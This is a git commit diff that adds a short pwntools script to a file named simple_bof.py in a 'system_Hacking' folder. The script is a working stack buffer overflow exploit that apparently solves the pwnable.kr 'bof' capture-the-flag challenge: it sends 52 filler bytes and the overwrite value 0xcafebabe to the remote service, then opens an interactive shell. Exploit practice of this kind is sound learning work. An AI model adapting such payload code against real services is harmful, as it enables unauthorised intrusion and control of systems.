bf820389cdafe9d7d7531b7c0cb83892e0c29d23
slow thinker <80503808+hero-rq@users.noreply.github.com>
2022-07-08 12:55:45 +0900

    Update simple_bof.py

--- system_Hacking/simple_bof.py
+++ system_Hacking/simple_bof.py
@@ -7,3 +7,15 @@ payload += p32(0xcafebabe)
 
 r.send(payload)
 r.interactive()
+
+#######################################
+
+from pwn import *
+
+r = remote('pwnable.kr', 9000)
+
+payload = b'A'*52
+payload += b'\xbe\xba\xfe\xca'
+
+r.send(payload)
+r.interactive()
